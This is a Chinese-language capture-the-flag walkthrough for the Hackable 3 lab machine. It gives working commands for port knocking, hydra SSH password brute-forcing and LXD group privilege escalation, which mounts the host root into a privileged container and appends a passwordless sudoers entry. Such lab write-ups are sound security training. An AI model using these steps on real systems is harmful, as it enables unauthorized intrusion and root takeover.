# 靶机信息
此靶机涉及信息收集，关于敲门服务的理解，以及编码的熟悉程度、图片隐写。横向移动对于信息的收集，以及lxd提权。

# 信息收集
## nmap扫描
```
# Nmap 7.95 scan initiated Fri Jan 16 01:57:10 2026 as: /usr/lib/nmap/nmap --privileged -sT -p- --min-rate 20000 -oA nmapScan/ports 192.168.218.239
Nmap scan report for 192.168.218.239
Host is up (0.00045s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:61:A5:AA (VMware)

# Nmap done at Fri Jan 16 01:57:13 2026 -- 1 IP address (1 host up) scanned in 2.57 seconds
```
只有80端口开放，猜测可能是webshell。老套路我就不继续扫描了，直接看

## web初始信息枚举
访问主页发现注释

><!-- "Please, jubiscleudo, don't forget to activate the port knocking when exiting your section, and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com" -->

感觉是敲门服务，并且得到一个用户 **jubiscleudo** ，以及 **jpg**后缀的文件

挂一个递归扫描
```
dirsearch -u http://192.168.218.239 -r
[02:45:21] 200 -  460B  - /backup/ 
[02:45:23] 200 -  507B  - /config.php
[02:45:27] 200 -    3KB - /home.html 
[02:45:30] 200 -  487B  - /login.php
[02:45:37] 200 -   33B  - /robots.txt 
[02:47:09] 200 -    9B  - /config/1.txt 
[02:47:46] 200 -   67B  - /css/2.txt
```
先看两个txt文件
1.txt 中是 `MTAwMDA=`  base64解码 **10000*
2.txt 中是 `++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>------------------....` Brainfuck解码 **4444**
确定是敲门服务了，还差一个应该文件名是3了，看一下别的文件

<img width="813" height="602" alt="Image" src="https://github.com/user-attachments/assets/c756f443-54cb-4561-8624-9911f0f5276f" />

里面提到 3.jpg 看一下

```
└─$ steghide info 3.jpg 
"3.jpg":
  format: jpeg
  capacity: 3.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "steganopayload148505.txt":
    size: 12.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes

cat steganopayload148505.txt 
porta:65535
 ```
确实有隐写正好是一个端口号。并且 `192.168.218.239/backup/wordlist.txt` 给了字典，那路径就清晰了。

# 初始shell获取
```
knock -v 192.168.218.239 10000 4444 65535 -d 100
hitting tcp 192.168.218.239:10000
hitting tcp 192.168.218.239:4444
hitting tcp 192.168.218.239:65535
```
先敲门打开22端口。
爆破一下
```
hydra -l jubiscleudo -P wordlist.txt ssh://192.168.218.239
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-16 02:33:31
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 300 login tries (l:1/p:300), ~19 tries per task
[DATA] attacking ssh://192.168.218.239:22/
[22][ssh] host: 192.168.218.239   login: jubiscleudo   password: onlymy
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-16 02:34:14
```
获得凭据 jubiscleudo:onlymy

登录ssh。

直接上linpeas扫

<img width="863" height="147" alt="Image" src="https://github.com/user-attachments/assets/5d7ee0b4-d90a-4ec0-9187-93fa7c568a5c" />

扫到一个凭据
没有开放mysql服务，试一下su过去。

可以！横向成功了。

# 提权
hackable_3用户下发现一个有趣的组 **LXD组** 搜索一下这个组的作用

简单来说，LXD 是一个 容器管理程序。可以把它想象成“更轻量级的虚拟机”或者是“加强版的 Docker”。LXD 的设计初衷是让用户能像管理虚拟机（VM）一样管理 Linux 容器。lxd能让你在一台机器上运行多个独立的 Linux 系统（如 Ubuntu, Debian, Alpine），它们共享同一个内核，但文件系统和进程是隔离的。通过 lxc 命令，你可以快速启动、停止或克隆一个完整的操作系统环境。

提权路径：
LXD 允许创建“特权容器”（Privileged Container）。在这种容器里，容器内的 Root 用户和宿主机的 Root 用户权限几乎是一样的。
LXD 允许你把宿主机的任何路径挂载到容器里。
LXD组用户可以创建一个容器，把宿主机的根目录（/）挂载到容器的 /mnt 下。此时，你在容器里以 Root 身份修改 /mnt/etc/shadow，就等于在宿主机上修改了 Root 密码。

OK，我们先准备一个系统镜像，用Alpine就行，因为它体积很小，[下载连接](https://github.com/saghul/lxd-alpine-builder/blob/master/alpine-v3.13-x86_64-20210218_0139.tar.gz)

将这个gz文件上传上去，然后导入镜像 `lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage`

再创建一个名为 pwn 的容器，并开启特权模式（这将允许容器内的 root 对应宿主机的 root）。这一步报错了，提示`Failed getting root disk: No root device could be found`，没有初始化，初始化一下 `lxd init`，一路回车就行，然后重来一遍

>lxc init myimage pwn -c security.privileged=true   --->创建特权容器
>lxc config device add pwn mydevice disk source=/ path=/mnt/root recursive=true   --->挂载宿主机根目录到容器的 /mnt/root
>lxc start pwn   --->启动容器
>lxc exec pwn /bin/sh   --->进入容器 Shell
>cat /mnt/root/root/root.txt   --->直接读flag
>echo "hackable_3 ALL=(ALL) NOPASSWD:ALL" >> /mnt/root/etc/sudoers   --->或者追加sudo权限给hackable_3用户

提权成功！

